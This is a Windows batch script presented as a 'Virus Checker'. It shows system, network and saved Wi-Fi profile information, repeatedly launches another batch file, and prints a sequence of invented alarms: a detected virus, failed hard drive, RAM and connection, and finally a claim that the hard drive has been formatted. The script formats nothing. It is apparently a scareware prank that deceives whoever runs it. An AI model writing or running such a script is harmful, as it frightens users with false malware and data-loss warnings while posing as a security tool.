@echo off
set v = %CD%
start OpenCmd.bat
cd %userprofile%\Desktop
title Virus Checker
echo Be careful what you allow! > Heavy_Information.txt
PING -n 2 127.0.0.1>nul
systeminfo
PING -n 2 127.0.0.1>nul
echo WARNING VIRUS DETECTED
cd %~dp0
start OpenCmd.bat
PING -n 2 127.0.0.1>nul
echo System check
dir %userprofile%
PING -n 2 127.0.0.1>nul
echo Checking IP
ipconfig
PING -n 2 127.0.0.1>nul
start OpenCmd.bat
echo Checking Network
netsh wlan show profile
PING -n 2 127.0.0.1>nul
echo Hard drive - FAILED
PING -n 2 127.0.0.1>nul
echo RAM - FAILED
PING -n 2 127.0.0.1>nul
start OpenCmd.bat
echo Disk Drive - FAILED
PING -n 2 127.0.0.1>nul
echo Connection - FAILED
PING -n 2 127.0.0.1>nul
start OpenCmd.bat
echo code 754*sd56625
PING -n 2 127.0.0.1>nul
echo -WARNING
echo Hard drive must be formatted to resume windows
PING -n 2 127.0.0.1>nul
start OpenCmd.bat
echo -WARNING
echo Hard drive has been formatted
PING -n 5 127.0.0.1>nul
exit